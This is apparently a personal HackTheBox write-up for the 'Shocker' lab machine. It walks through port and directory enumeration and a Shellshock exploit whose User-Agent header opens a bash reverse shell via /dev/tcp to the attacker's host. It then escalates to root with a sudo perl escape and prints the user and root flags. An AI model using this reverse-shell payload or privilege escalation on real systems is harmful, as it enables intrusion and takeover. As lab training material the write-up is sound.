---
Category:
  - B2R
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [GTFObins, Shellshock, privesc/perl, Linux]
---
# Resolution summary

>[!summary]
>- Web server is vulnerable to **Shellshock**, allowing to obtain a low privileged shell as shelly
>- shelly is allowd to execute **perl with high privileges**. It is possible to abuse the '-e' function to spawn a new shell with high privileges

## Improved skills

- Exploit Shellshock
- Exploit GTFOBins to escalate privileges

## Used tools

- nmap
- gobuster

---

# Information Gathering

Scanned all TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Shocker]
└─$ sudo nmap -sS -p- 10.10.10.56 -oN scans/all-tcp-ports.txt -v -Pn -T4
...
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

Enumerated open TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Shocker]
└─$ sudo nmap -sT -sV -sC -p80,2222 10.10.10.56 -oN scans/open-tcp-ports.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-02 08:21 EDT
Nmap scan report for 10.10.10.56
Host is up (0.095s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration

## Port 80 - HTTP (Apache/2.4.18 (Ubuntu))

Enumerated port 80 with a browser:

![Pasted image 20210502141537.png](../../zzz_res/attachments/Pasted_image_20210502141537.png)

Enumerated files and directories using gobuster:

```bash
$ gobuster dir -u http://10.10.10.56 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o scans/p80-directories.txt 
$ gobuster dir -u http://10.10.10.56 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -o scans/p80-files.txt
/cgi-bin/             (Status: 403) [Size: 294]
/icons/               (Status: 403) [Size: 292]
/server-status/       (Status: 403) [Size: 300]
/index.html           (Status: 200) [Size: 137]
/.htaccess            (Status: 403) [Size: 295]
/.                    (Status: 200) [Size: 137]
/.html                (Status: 403) [Size: 291]
/.htpasswd            (Status: 403) [Size: 295]
/.htm                 (Status: 403) [Size: 290]
/.htpasswds           (Status: 403) [Size: 296]
/.htgroup             (Status: 403) [Size: 294]
/.htaccess.bak        (Status: 403) [Size: 299]
/.htuser              (Status: 403) [Size: 293]
/.ht                  (Status: 403) [Size: 289]
/.htc                 (Status: 403) [Size: 290]
```

Enumerated contents of cgi-bin directory:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Shocker/exploit]
└─$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x cgi,pl,sh
...
/user.sh              (Status: 200) [Size: 118]
...
```

Enumerated contents of user.sh:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Shocker/exploit]
└─$ curl http://10.10.10.56/cgi-bin/user.sh -i
HTTP/1.1 200 OK
Date: Sun, 02 May 2021 13:36:22 GMT
Server: Apache/2.4.18 (Ubuntu)
Transfer-Encoding: chunked
Content-Type: text/x-sh

Content-Type: text/plain

Just an uptime test script

 09:36:22 up  1:16,  0 users,  load average: 0.00, 0.02, 0.00
```

# Exploitation

## Shellshock

Tested if the target was vulnerable to Shellshock: [PayloadsAllTheThings/Shellshock.py at master · R0B1NL1N/PayloadsAllTheThings](https://github.com/R0B1NL1N/PayloadsAllTheThings/blob/master/CVE%20Shellshock%20Heartbleed/Shellshock.py)

```bash
() { foo;}; echo Content-Type: text/plain ; echo ; echo vulnerable!
```

![Pasted image 20210502155512.png](../../zzz_res/attachments/Pasted_image_20210502155512.png)

Exploited Shellshock: [Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/34900)

```
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
User-Agent: () { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/10.10.14.24/10099 0>&1 &
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Shocker/exploit]
└─$ curl -i -s -k -X $'GET' \
    -H $'Host: 10.10.10.56' -H $'User-Agent: () { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/10.10.14.24/10099 0>&1 &' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://10.10.10.56/cgi-bin/user.sh'
HTTP/1.1 200 OK
Date: Sun, 02 May 2021 13:46:55 GMT
Server: Apache/2.4.18 (Ubuntu)
Connection: close
Transfer-Encoding: chunked
Content-Type: text/x-sh

Content-Type: text/plain

Just an uptime test script

 09:46:55 up  1:26,  0 users,  load average: 0.00, 0.00, 0.00
```

Reverse shell:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Shocker/exploit]
└─$ nc -nlvp 10099
listening on [any] 10099 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.56] 52156
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
python3 -c 'import pty; pty.spawn("/bin/bash")'
shelly@Shocker:/usr/lib/cgi-bin$ id
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

# Privilege Escalation

## Local enumeration

Enumerated sudo privileges:

```bash
shelly@Shocker:/home/shelly$ whoami
shelly
shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

## perl privilege escalation

[perl | GTFOBins](https://gtfobins.github.io/gtfobins/perl/)

```bash
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
# whoami && hostname && cat /root/root.txt && ifconfig -a
root
Shocker
2c8adfef39e116a621c30e5821bc1a0a
ens33     Link encap:Ethernet  HWaddr 00:50:56:b9:36:c8
          inet addr:10.10.10.56  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feb9:36c8/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:feb9:36c8/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:609642 errors:0 dropped:61 overruns:0 frame:0
          TX packets:599371 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:87129953 (87.1 MB)  TX bytes:237046382 (237.0 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:33152 errors:0 dropped:0 overruns:0 frame:0
          TX packets:33152 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:2455152 (2.4 MB)  TX bytes:2455152 (2.4 MB)
```

![Pasted image 20210502155755.png](../../zzz_res/attachments/Pasted_image_20210502155755.png)

# Trophy

>[!quote]
>Only two things are infinite, the universe and human stupidity, and I'm not sure about the former.
>
>\- Albert Einstein
 
>[!success]
**User.txt**
dbb2441e5811499979deb974d1afd19c

>[!success]
>**Root.txt**
>2c8adfef39e116a621c30e5821bc1a0a